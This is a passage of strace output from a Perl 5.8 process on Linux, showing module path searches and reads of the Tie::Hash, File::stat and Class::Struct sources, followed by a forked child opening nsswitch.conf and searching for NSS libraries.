4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
12268 07:41:34.953412 stat64("/etc/perl/Tie/Hash.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.953469 stat64("/etc/perl/Tie/Hash.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.953498 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.953511 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.953525 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.953538 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.953552 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.953564 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.953590 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.953602 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.953615 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.953627 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.953641 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.953654 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
12268 07:41:34.953675 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
12268 07:41:34.953689 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9bff88) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.953700 _llseek(8, 0, [0], SEEK_CUR) = 0
12268 07:41:34.953719 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
12268 07:41:34.954072 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
12268 07:41:34.954626 read(8, "", 4096) = 0
12268 07:41:34.954643 close(8)          = 0
12268 07:41:34.954674 stat64("/etc/perl/File/stat.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.954689 stat64("/etc/perl/File/stat.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.954703 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.954715 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.954729 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.954741 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.954755 stat64("/usr/lib/perl5/File/stat.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.954767 stat64("/usr/lib/perl5/File/stat.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.954780 stat64("/usr/share/perl5/File/stat.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.954792 stat64("/usr/share/perl5/File/stat.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.954805 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.954817 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.954831 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.954843 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
12268 07:41:34.954864 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
12268 07:41:34.954880 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9bff88) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.954891 _llseek(8, 0, [0], SEEK_CUR) = 0
12268 07:41:34.954937 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
12268 07:41:34.955345 stat64("/etc/perl/Class/Struct.pmc", 0xbf9bfdbc) = -1 ENOENT (No such file or directory)
12268 07:41:34.955363 stat64("/etc/perl/Class/Struct.pm", 0xbf9bfccc) = -1 ENOENT (No such file or directory)
12268 07:41:34.955376 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbf9bfdbc) = -1 ENOENT (No such file or directory)
12268 07:41:34.955389 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbf9bfccc) = -1 ENOENT (No such file or directory)
12268 07:41:34.955431 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbf9bfdbc) = -1 ENOENT (No such file or directory)
12268 07:41:34.955445 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbf9bfccc) = -1 ENOENT (No such file or directory)
12268 07:41:34.955476 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbf9bfdbc) = -1 ENOENT (No such file or directory)
12268 07:41:34.955492 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbf9bfccc) = -1 ENOENT (No such file or directory)
12268 07:41:34.955506 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbf9bfdbc) = -1 ENOENT (No such file or directory)
12268 07:41:34.955518 stat64("/usr/share/perl5/Class/Struct.pm", 0xbf9bfccc) = -1 ENOENT (No such file or directory)
12268 07:41:34.955531 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbf9bfdbc) = -1 ENOENT (No such file or directory)
12268 07:41:34.955543 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbf9bfccc) = -1 ENOENT (No such file or directory)
12268 07:41:34.955557 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbf9bfdbc) = -1 ENOENT (No such file or directory)
12268 07:41:34.955570 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
12268 07:41:34.955591 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
12268 07:41:34.955605 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9bfad8) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.955616 _llseek(10, 0, [0], SEEK_CUR) = 0
12268 07:41:34.955635 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
12268 07:41:34.956053 brk(0x82de000)    = 0x82de000
12268 07:41:34.956402 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
12268 07:41:34.957104 _llseek(10, 6916, [6916], SEEK_SET) = 0
12268 07:41:34.957126 _llseek(10, 0, [6916], SEEK_CUR) = 0
12268 07:41:34.957140 close(10)         = 0
12268 07:41:34.957362 _llseek(8, 1334, [1334], SEEK_SET) = 0
12268 07:41:34.957382 _llseek(8, 0, [1334], SEEK_CUR) = 0
12268 07:41:34.957427 close(8)          = 0
12268 07:41:34.958208 brk(0x82ff000)    = 0x82ff000
12268 07:41:34.958367 _llseek(6, 2689, [2689], SEEK_SET) = 0
12268 07:41:34.958392 _llseek(6, 0, [2689], SEEK_CUR) = 0
12268 07:41:34.958431 close(6)          = 0
12268 07:41:34.958613 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d43908) = 12269
12269 07:41:34.973248 getppid()         = 12268
12269 07:41:34.973868 open("/etc/nsswitch.conf", O_RDONLY) = 6
12269 07:41:34.973918 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
12269 07:41:34.973953 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f09000
12269 07:41:34.973979 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
12269 07:41:34.974033 read(6, "", 4096) = 0
12269 07:41:34.974043 close(6)          = 0
12269 07:41:34.974053 munmap(0xb7f09000, 4096) = 0
12269 07:41:34.974081 open("/etc/ld.so.cache", O_RDONLY) = 6
12269 07:41:34.974094 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12269 07:41:34.974111 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d10000
12269 07:41:34.974123 close(6)          = 0
12269 07:41:34.974134 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12269 07:41:34.974152 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.974167 stat64("/lib/tls/i686/sse2/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.974186 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.974200 stat64("/lib/tls/i686/sse2", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.974211 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
